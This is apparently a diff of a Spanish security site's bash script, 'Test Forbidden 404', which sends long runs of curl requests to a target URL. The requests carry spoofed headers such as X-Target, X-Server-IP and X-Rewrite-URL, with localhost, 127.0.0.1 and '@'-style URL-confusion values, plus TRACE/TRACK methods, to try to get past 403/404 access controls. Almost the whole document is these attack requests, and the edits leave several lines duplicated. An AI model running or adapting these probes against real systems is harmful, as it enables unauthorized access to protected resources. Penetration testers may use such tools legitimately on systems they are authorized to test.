@@ -3,28 +3,28 @@ echo "Test Forbidden 404"
 echo "(c) hackingyseguridad.com 2021"
 echo  
 curl -I -k --path-as-is $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1:80@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1:80@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1:80@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1:80/secure@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1:80@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1#@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -38,8 +38,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http:/
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: http://127.0.0.1:80 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -60,27 +60,27 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: 127.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: 127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Wap-Profile: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Url-Scheme: https' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-URLSCHEME: https' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Url-Scheme: http' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-URLSCHEME: http' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1:80@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1:80@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1:80@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -91,7 +91,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -105,8 +105,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: http://127.0.0.1:80 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -127,25 +127,25 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: 127.0.0.1' 
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: 127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Target: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'XSTH: XSTV' -H 'User-Agent: Forbidden/5.4' -X 'TRACK' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'XSTH: XSTV' -H 'User-Agent: Forbidden/5.4' -X 'TRACE' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: ' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: localhost' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://localhost:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1:80@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1:80@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1:80@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -156,7 +156,7 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1#@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1#@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -170,8 +170,8 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: http://127.0.0.1:80 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: 192.168.1.5:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: 192.168.1.5' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: 127.0.0.1:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
+curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: 127.0.0.1' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: 127.0.0.1@http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: 127.0.0.1@github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: 127.0.0.1@github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
@@ -192,23 +192,23 @@ curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: 127.0.0.
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: 127.0.0.1 @http://github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: 127.0.0.1 @github.com:80' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
 curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: 127.0.0.1 @github.com' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: /secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Server-IP: /secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: secure/' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET' $1/robots.txt
-curl -m 5 --connect-timeout 5 -i -s -k -L --path-as-is -H 'X-Rewrite-URL: secure' -H 'User-Agent: Forbidden/5.4' -X 'GET'  $1
